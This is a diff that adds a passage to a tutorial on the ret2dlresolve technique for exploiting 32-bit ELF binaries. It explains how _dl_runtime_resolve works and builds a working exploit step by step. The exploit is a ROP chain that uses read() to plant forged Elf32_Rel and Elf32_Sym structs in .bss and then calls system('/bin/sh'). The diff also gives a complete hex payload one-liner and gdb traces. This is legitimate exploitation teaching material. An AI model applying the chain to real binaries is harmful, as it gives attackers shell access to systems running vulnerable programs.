@@ -305,9 +305,41 @@ typedef struct {
 
 #### _dl_runtime_resolve Function
 
-//incoming
+When the program call a exertnal function first, it resolve is address by calling the _dl_runtime_resolve.
 
-**3** ways:
+You can see it at plt[0] which is the function which set up and call the resolver:
+
+```py
+pwndbg> x/2i 0x80482f0 # plt default stub
+0x80482f0:  push  DWORD PTR ds:0x804a004 # push link_map
+0x80482f6:  jmp   DWORD PTR ds:0x804a008 # jmp _dl_runtime_resolve
+pwndbg> x/wx 0x804a008
+0x804a008:  0xf7fe7b10 # _dl_runtime_resolve
+```
+
+Two things are done before calling the resolver:
+
+- push the reloc offset (relog_arg /rel_offset) on the stack
+
+The rel_offset is the distance between the .rel.plt and the entry of the function to resolve.
+
+- push link_map (read@got) it help write the address after the resolution.
+
+Pseudo code of _dl_runtime_resolve:
+
+```c
+// call of unresolved read(0, buf, 0x100)
+_dl_runtime_resolve(link_map, rel_offset) {
+    Elf32_Rel * rel_entry = JMPREL + rel_offset ;
+    Elf32_Sym * sym_entry = &SYMTAB[ELF32_R_SYM(rel_entry->r_info)];
+    char * sym_name = STRTAB + sym_entry->st_name ;
+    _search_for_symbol_(link_map, sym_name);
+    // invoke initial read call now that symbol is resolved
+    read(0, buf, 0x100);
+}
+```
+
+There is **3** ways to exploit it:
 
 #### Direct control over the content of the .rel.plt items
 
@@ -346,14 +378,230 @@ int main(void)
 
 Follow the [payload](/pwn/payload/payload_ret2dlresolve_32bit_partialRELRO.py).
 
-//incoming
+Shema of the exploit : 
 
+```py
+_dl_runtime_resolve(link_map, rel_offset)
+                                       +
+          +-----------+                |
+          | Elf32_Rel | <--------------+
+          +-----------+
+     +--+ | r_offset  |        +-----------+
+     |    |  r_info   | +----> | Elf32_Sym |
+     |    +-----------+        +-----------+      +----------+
+     |      .rel.plt           |  st_name  | +--> | system\0 |
+     |                         |           |      +----------+
+     v                         +-----------+        .dynstr
++----+-----+                      .dynsym
+| <system> |
++----------+
+  .got.plt
+```
+
+```py
+# get section address
+BSS    = elf.get_section_by_name('.bss').header['sh_addr']
+PLT    = elf.get_section_by_name('.plt').header['sh_addr'] #dl = plt[0]
+STRTAB = elf.get_section_by_name('.dynstr').header['sh_addr']
+SYMTAB = elf.get_section_by_name('.dynsym').header['sh_addr']
+JMPREL = elf.get_section_by_name('.rel.plt').header['sh_addr'] # rel.plt
+# Gadget
+GADGET_POP3RET = 0x080484b9 # pop esi, pop edi, pop ebp, ret
+```
+
+
+- Get section address, readable with the bash command `readelf` and find a gadget with [ROPgadget](/tools/RopGadget.md). We dont care in which register it pop the stack.
+
+```py
+reloc_offset = BSS - JMPREL # our fake offset to our fake rel.plt struct
+```
+
+- We gonna create a fake Elf32_Rel struct and fake Elf32_Sym struct to resolve the systeme function.
+
+As i told you, when _dl_runtime_resolve is call, it take as argument the reloc arg, this reloc is use this way:  
+
+```py
+fake_Elf32_rel = JMPREL + reloc_offset
+```
+
+- We gonna write fake structs (Elf32_Rel and Elf32_Sym) in the BSS section because this section is fill with bunch of '\0' and is writable.
+
+- So When the _dl_runtime_resolve is call, you want him to use our fake struct by passing him the good offset.
+
+```py
+binsh_addr = BSS + 12 + 16 + 8
+```
+
+- This is where "/bin/sh" will be stored in the BSS section, sizeof(Elf32_Rel) + sizeof(Elf32_Sym) + sizeof("system\0\0")
+
+```py
+stage1 = b'A' * OFFSET
+# call read(stdin, bss, 0x64)
+stage1 += p32(elf.plt["read"])  # read offset int the .plt section
+stage1 += p32(GADGET_POP3RET)   # Pop read arg and ret to PLT[0] -> resolver
+stage1 += p32(0)                # stdin
+stage1 += p32(BSS)              # buffer
+stage1 += p32(0x64)             # length
+# call plt[0] = system("/bin/sh")
+stage1 += p32(PLT)              # ret2PLT (call system function)
+stage1 += p32(reloc_offset)     # JMPREL + reloc_offset points to BSS (fake Elf32_Rel struct)
+stage1 += p32(0xdeadbeef)           # return pointer after resolution
+stage1 += p32(binsh_addr)       # arg for system function
+# print(''.join(['\\x{:02x}'.format(ord(byte)) for byte in stage1]))
+p.send(stage1)
+```
+
+- overwrite eip with read()
+- when the function gonna end, it will return to GADGET_POP3RET. This gadget will be use to clean the stack and call the next function. (clean read arg push on the stack).
+- read args are push: 0, BSS address, 100 / 0x64: `read(0, BSS, 100);`
+- We gonna see juste later what we write in the BSS buffer.
+- So next idea is recal PLT[0] to trigger the _dl_runtime_resolve (remember the gadget will pop 3 times and ret to the next address on the stack (PLT[0])).
+- _dl_runtime_resolve need arg push in the stack:
+- reloc_offset allready calculed (at the start of BSS section).
+- _dl_runtime_resolve will call the system function, at the end it return to the next address on the stack: `0xdeadbeaf`.
+- Finally we need to pass to the system function the address of the "/bin/sh" strings calculed too. (at the end of the structs in BSS).
+
+Stage 2 is about to write struct in the BSS section:
+
+```py
+#Fake Elf32_Rel
+stage2 = p32(elf.got['read']) # after resolving symbol write the actual address of function
+stage2 += p32(r_info)
+
+```
+
+Lets try understand what happend here:
+
+```py
+                      BSS
+--------------------------------------------------
+|                                                |
+| Elf32_REl | Elf32_Sym | system\0\0 | /bin/sh\0 |
+|    12           16         8                   |
+--------------------------------------------------
+```
+
+Fake Elf32_Rel contain two things: 
+
+```c
+   Elf32_Addr r_offset ; /* Address */ 
+   Elf32_Word r_info ; /* Relocation type and symbol index */ 
+```
+
+- r_offset is the address of a function in the GOT. For the vuln code uptheree we'll pass read@got.
+- r_info is more complex: it store two things
+  - index of the symbol
+  - 07 at the end (type)
+
+You can write r_info this way:
+
+```py
+dynsym_idx = ((BSS + (0x4 * 3)) - SYMTAB) // 0x10 # index to the Elf32_Sym which is store in BSS + 12
+r_info = (dynsym_idx << 8) | 0x7
+```
+
+- The idx looks comlex but it is not: i sub Symtab to BSS + 12 to get the offset of the fack Elf32_sym.
+- The _dl_runtime_resolve will find the symbol this way:
+
+```c
+Elf32_Sym fake_sym = (Elf32_Sym)SYMTAB[idx];
+```
+
+We divide by 0x10 because size of Sym is 16 (remember we want an index not the offset).
+
+```py
+stage2 += p32(0) #padding
+#Fake Elf32_Sym
+stage2 += p32(dynstr_offset)
+stage2 += p32(0) * 3
+#Strings
+stage2 += b'system\x00\x00'
+stage2 += b'/bin/sh\x00'
+```
+
+- In the fake Sym, only the first info will be use dynamic string offset.
+- I had to padd the Sym to make it work well
+- Dynstr_offset i used this way
+
+```c
+Symbol_name_to_resolve = STRTAB + offset.
+```
+
+- In our case, the string wont be located to strtab, but in bss, we need to give it the correct offset
+
+```py
+dynstr_offset = (BSS + (0x4 * 7)) - STRTAB
+```
+
+BSS + 0x4 * 7 points to the system string. So if you sub the address of STRTAB it give you the offset.
+
+### POC:
+
+One line command to help us debbuged with gdb: buffer1 + padding to fille the 100 read + buffer2.
+
+```py
+python3 -c 'import sys; sys.stdout.buffer.write(b"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xe0\x82\x04\x08\xb9\x84\x04\x08\x00\x00\x00\x00\x20\xa0\x04\x08\x64\x00\x00\x00\xd0\x82\x04\x08\x88\x1d\x00\x00\xef\xbe\xad\xde\x44\xa0\x04\x08" + b"A" * 36 + b"\x0c\xa0\x04\x08\x07\xe6\x01\x00\x00\x00\x00\x00\x20\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x73\x79\x73\x74\x65\x6d\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00")'
+```
+
+```py
+b _dl_runtime_resolve
+r < <(python3 -c '\x41\x41....')
+c
+c
+x/4xw $esp
+0xffffda80│+0x0000: 0xf7ffd940  →  0x00000000	 ← $esp
+0xffffda84│+0x0004: 0x00001d88
+0xffffda88│+0x0008: 0xdeadbeef
+0xffffda8c│+0x000c: 0x0804a044  →  "/bin/sh"
+```
+
+Top of the stack before the exec of runtime_resolve.
+
+- forge_link
+- offset JMRPREL
+- return pointer
+- system arg
+
+```py
+[*] Section Headers
+[*] BSS:         0x804a020
+[*] PLT:         0x80482d0
+[*] STRTAB:      0x804821c
+[*] SYMTAB:      0x80481cc
+[*] JMPREL:      0x8048298
+[*] READ:        0x80482e0
+```
+
+```py
+x/3xw 0x8048298 + 0x00001d88 #.rel.plt JMPREL 
+0x804a020:	0x0804a00c	0x0001e607	0x00000000
+```
+
+It's our fake Elf32_Rel
+
+- 0x0804a00c read@got
+- 0x0001e607 index of sym in the symtable + type
+
+```py
+x/2xw 0x80481cc + (0x0001e6 * 16) #SYMTAB[1e6]
+0x804a02c:	0x00001e20	0x00000000
+```
+
+It's our fake Elf32_Sym
+
+- 0x00001e20 is the offset bettween the STRTAB and and the string to resolve
+
+```py
+x/2s 0x804821c + 0x00001e20
+0x804a03c:	"system"
+```
 
 ### Documentation
 
 - [Amazing videos of Chris Kanich](https://www.youtube.com/watch?v=Ss2e6JauS0Y)
 - [ret2 tuto: binary exploitation](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation)
 - [ret2 tuto:tistory](https://wyv3rn.tistory.com/225#----%--return%--to%--dl-resolve)
+- [ret2 tuto:hackmd.io](https://hackmd.io/@v13td0x/ret2dlresolve#x86)
 
 ---
 
